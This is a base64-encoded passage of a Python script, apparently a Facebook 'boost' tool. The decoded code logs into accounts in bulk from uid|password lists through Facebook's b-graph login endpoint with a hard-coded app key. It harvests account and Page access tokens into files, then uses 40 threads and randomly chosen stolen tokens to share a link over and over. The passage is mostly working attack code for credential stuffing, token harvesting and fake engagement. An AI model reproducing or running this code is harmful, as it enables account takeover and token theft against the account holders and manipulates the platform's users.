UgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZH0ge2dyZWVufUFMUkVBRFkgRVhJU1RTIikKICAgICAgICByZXR1cm4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgIyBFeHRyYWN0IEZhY2Vib29rIFBhZ2VzIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWNjb3VudCB0b2tlbgogICAgICAgICAgICBwYWdlcyA9IGV4dHJhY3RfZmJfcGFnZXModG9rZW4pCiAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgZm9yIHBhZ2UgaW4gcGFnZXM6CiAgICAgICAgICAgICAgICAgICAgcGFnZV9pZCA9IHBhZ2VbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBpZiBwYWdlX2lkIG5vdCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7cGFnZV9pZH18e3BhZ2VbJ2FjY2Vzc1Rva2VuJ119XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59UGFnZSBJRDoge3JlZH17cGFnZV9pZH0ge3llbGxvd31FWFRSQUNURUQgU1VDQ0VTU0ZVTExZIikKICAgICAgICAgICAgICAgICAgICAgICAgZXhpc3RpbmdfdG9rZW5zLmFkZChwYWdlX2lkKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfUlEOiAge3BhZ2VfaWR9IOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufUFMUkVBRFkgRVhJU1RTICEgIikKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSDilIDilIDilIDilIDilIA+IHtyZWR9RE9FU04nVCBIQVZFIFBBR0VTICEiKQogICAgICAgICAgICAKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie3doaXRlfXt1aWR9ICDilIDilIDilIDilIDilIA+IHtyZWR9RkFJTEVEIFRPIEVYVFJBQ1QgISAiKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfSIpCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KICAgIAogICAgcGFnZXNfZGF0YSA9IFtdCiAgICAKICAgIHdoaWxlIHVybDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtyZXNwb25zZS50ZXh0fScpCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGZvciBwYWdlIGluIGRhdGEuZ2V0KCdkYXRhJywgW10pOgogICAgICAgICAgICBwYWdlc19kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICdhY2Nlc3NUb2tlbic6IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIHVybCA9IGRhdGEuZ2V0KCdwYWdpbmcnLCB7fSkuZ2V0KCduZXh0JykgICMgVXBkYXRlIHRoZSBVUkwgZm9yIHRoZSBuZXh0IHJlcXVlc3QKCiAgICByZXR1cm4gcGFnZXNfZGF0YQoKZGVmIHByb3pjKGFjY291bnRzX2ZpbGUsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUpOgogICAgc3VjY2Vzc19jb3VudCA9IFtdCiAgICBleGlzdGluZ190b2tlbnMgPSBsb2FkX2V4aXN0aW5nX3Rva2Vucyh0b2tlbl9vdXRwdXRfcGF0aCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGhfcGFnZSwgdWlkLCBwdywgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdG9rZW5zKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKZGVmIGV4dHJhY3Rpb24oKToKCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMV0ge3llbGxvd31FWFRSQUNUIHtyZWR9QUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3doaXRlfVsyXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1QQUdFUyIpCiAgICBwcmludCgiICAgICBcMDMzWzE7MTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufUNIT0lDRSA6ICIpLnN0cmlwKCkgCiAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgIGF4bDEoKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGF4bDIoKQogICAgZWxzZToKICAgICAgICBwcmludChmIiAgICAge3JlZH1JTlZBTElEIENIT0lDRSIpCmRlZiBheGwyKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgZm9sZGVyX3BhdGggPSAiL3NkY2FyZC9ib29zdHBoZXJlIiAgCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAxXSBcMDMzWzMybUZSQSBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAyXSBcMDMzWzMybUZSQSBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswM10gXDAzM1szMm1SUFcgRVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswNF0gXDAzM1szMm1SUFcgRVhUUkFDVCBQQUdFUyIpCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgc2F2ZV9jaG9pY2UgPSBpbnB1dChmIiAgICAgXDAzM1szMm1DSE9JQ0U6ICIpLnN0cmlwKCkKCiAgICBpZiBzYXZlX2Nob2ljZSA9PSAnMSc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMic6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzMnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV0FDQ09VTlQudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAnYWNjb3VudCcKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzQnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV1BBR0VTLnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ3BhZ2UnCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szM21USEUgRk9STUFUIFNIT1VMRCBCRSBcMDMzWzMxbXVpZHxwYXNzIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIiAgICAgXDAzM1szM21QQVRIOiAiKS5zdHJpcCgpCgogICAgcHJvemMoZmlsZV9wYXRoLCBhY2NvdW50X2ZpbGUsIGV4dHJhY3RfdHlwZSkKZGVmIGF4bDEoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmb2xkZXJfcGF0aCA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAxXSBcMDMzWzMybUZSQSBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAyXSBcMDMzWzMybUZSQSBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswM10gXDAzM1szMm1SUFcgRVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswNF0gXDAzM1szMm1SUFcgRVhUUkFDVCBQQUdFUyIpCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgc2F2ZV9jaG9pY2UgPSBpbnB1dChmIiAgICAgXDAzM1szMm1DSE9JQ0U6ICIpLnN0cmlwKCkKCiAgICBpZiBzYXZlX2Nob2ljZSA9PSAnMSc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMic6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzMnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV0FDQ09VTlQudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAnYWNjb3VudCcKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzQnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV1BBR0VTLnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ3BhZ2UnCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szM21USEUgRk9STUFUIFNIT1VMRCBCRSBcMDMzWzMxbXVpZHxwYXNzIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIiAgICAgXDAzM1szM21QQVRIOiAiKS5zdHJpcCgpCgogICAgdG9rZW5fb3V0cHV0X3BhdGggPSBhY2NvdW50X2ZpbGUKCiAgICBwcm96KGZpbGVfcGF0aCwgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSkKCgpkZWYgZ2V0X3Rva2VuX2Zyb21fZmlsZShmaWxlX3BhdGgpOgogICAgIiIiUmVhZCB0b2tlbnMgZnJvbSB0aGUgZmlsZSBhbmQgcmV0dXJuIGEgcmFuZG9tIHRva2VuLiIiIgogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkuc3BsaXQoJ3wnKVsxXSBmb3IgbGluZSBpbiBsaW5lcyBpZiAnfCcgaW4gbGluZV0KICAgIHJldHVybiByYW5kb20uY2hvaWNlKHRva2VucykKCmNsYXNzIEZhY2Vib29rUG9zdGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGxpbmspOgogICAgICAgIHNlbGYubGluayA9IGxpbmsKCiAgICBkZWYgc2hhcmVfcG9zdChzZWxmLCB0b2tlbik6CiAgICAgICAgIiIiU2hhcmVzIGEgcG9zdCBvbiB0aGUgdXNlcidzIGZlZWQgd2l0aCAnT25seSBNZScgcHJpdmFjeS4iIiIKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjEzLjAvbWUvZmVlZCIKICAgICAgICBwYXlsb2FkID0gewogICAgICAgICAgICAnbGluayc6IHNlbGYubGluaywKICAgICAgICAgICAgJ3B1Ymxpc2hlZCc6ICcwJywKICAgICAgICAgICAgJ3ByaXZhY3knOiAneyJ2YWx1ZSI6IlNFTEYifScsCiAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiB0b2tlbgogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkKICAgICAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICBwcmludCgiICAgICAgU3VjY2Vzc2Z1bGx5IFNoYXJlZCIpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBzaGFyZV9pbl90aHJlYWRzKGxpbmssIGZpbGVfcGF0aCwgbnVtX3NoYXJlcyk6CiAgICBzdGFydF9hbGwgPSB0aW1lLnRpbWUoKSAgIyBSZWNvcmQgdGhlIHN0YXJ0IHRpbWUgZm9yIHRoZSBlbnRpcmUgb3BlcmF0aW9uCiAgICAKICAgIGRlZiB3b3JrZXIoKToKICAgICAgICBzdWNjZXNzID0gRmFsc2UKICAgICAgICB3aGlsZSBub3Qgc3VjY2VzczoKICAgICAgICAgICAgdG9rZW4gPSBnZXRfdG9rZW5fZnJvbV9maWxlKGZpbGVfcGF0aCkKICAgICAgICAgICAgZmJfcG9zdGVyID0gRmFjZWJvb2tQb3N0ZXIobGluaykKICAgICAgICAgICAgc3VjY2VzcyA9IGZiX3Bvc3Rlci5zaGFyZV9wb3N0KHRva2VuKQoKICAgIG1heF93b3JrZXJzID0gNDAKICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICBmb3IgXyBpbiByYW5nZShudW1fc2hhcmVzKToKICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHdvcmtlcikKCiAgICBlbmRfYWxsID0gdGltZS50aW1lKCkgICMgUmVjb3JkIHRoZSBlbmQgdGltZSBmb3IgdGhlIGVudGlyZSBvcGVyYXRpb24KICAgIGR1cmF0aW9uID0gZW5kX2FsbCAtIHN0YXJ0X2FsbAogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIlxuICB7eWVsbG93fVNoYXJpbmcgc3RhcnRlZDoge3N0YXJ0X2FsbH0iKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAge3llbGxvd31TaGFyaW5nIGVuZGVkOiB7ZW5kX2FsbH0iKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICB7eWVsbG93fVRvdGFsIGR1cmF0aW9uOiB7ZHVyYXRpb246LjJmfSBzZWNvbmRzXDAzM1swbSIpCmRlZiBjb3VudF90b2tlbnMoYWNjb3VudHNfZmlsZSwgcGFnZXNfZmlsZSk6CiAgICAiIiJDb3VudCB0aGUgbnVtYmVyIG9mIGFjY291bnRzIGFuZCBwYWdlcyBzdG9yZWQgaW4gdGhlIHJlc3BlY3RpdmUgZmlsZXMuIiIiCiAgICB0b3RhbF9hY2NvdW50cyA9IDAKICAgIHRvdGFsX3BhZ2VzID0gMAoKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oYWNjb3VudHNfZmlsZSwgJ3InKSBhcyBhZjoKICAgICAgICAgICAgdG90YWxfYWNjb3VudHMgPSBzdW0oMSBmb3IgbGluZSBpbiBhZiBpZiBsaW5lLnN0cmlwKCkpICAjIENvdW50IG5vbi1lbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KGYiQWNjb3VudCBmaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHBhZ2VzX2ZpbGUsICdyJykgYXMgcGY6CiAgICAgICAgICAgIHRvdGFsX3BhZ2VzID0gc3VtKDEgZm9yIGxpbmUgaW4gcGYgaWYgbGluZS5zdHJpcCgpKSAgIyBDb3VudCBub24tZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIlBhZ2UgZmlsZSBub3QgZm91bmQ6IHtwYWdlc19maWxlfSIpCgogICAgcmV0dXJuIHRvdGFsX2FjY291bnRzLCB0b3RhbF9wYWdlcwpkZWYgc2hhcmUoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICBcMDMzW